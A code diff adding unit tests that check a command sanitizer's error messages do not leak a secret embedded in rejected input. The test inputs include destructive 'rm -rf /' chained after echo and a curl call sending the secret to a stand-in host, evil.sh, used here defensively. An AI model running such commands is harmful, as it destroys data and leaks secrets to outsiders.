@@ -565,3 +565,32 @@ describe('error message sanitization (issue #897)', () => {
     expect(err.message).not.toContain(long)
   })
 })
+
+describe('sanitizeCommand error message sanitization (issue #906)', () => {
+  test('metacharacter rejection does not leak raw command input', () => {
+    const secret = 'SUPER_SECRET_VALUE_12345'
+    const command = `echo ${secret}; rm -rf /`
+    expect(() => sanitizeCommand(command)).toThrow()
+    expect(() => sanitizeCommand(command)).toThrow(
+      new RegExp(`^(?!.*${secret}).*$`),
+    )
+  })
+
+  test('operator rejection does not leak raw command input', () => {
+    const secret = 'SUPER_SECRET_VALUE_12345'
+    const command = `echo ${secret} && rm -rf /`
+    expect(() => sanitizeCommand(command)).toThrow()
+    expect(() => sanitizeCommand(command)).toThrow(
+      new RegExp(`^(?!.*${secret}).*$`),
+    )
+  })
+
+  test('allowlist rejection does not leak raw command input', () => {
+    const secret = 'SUPER_SECRET_VALUE_12345'
+    const command = `curl http://evil.sh/${secret}`
+    expect(() => sanitizeCommand(command)).toThrow()
+    expect(() => sanitizeCommand(command)).toThrow(
+      new RegExp(`^(?!.*${secret}).*$`),
+    )
+  })
+})
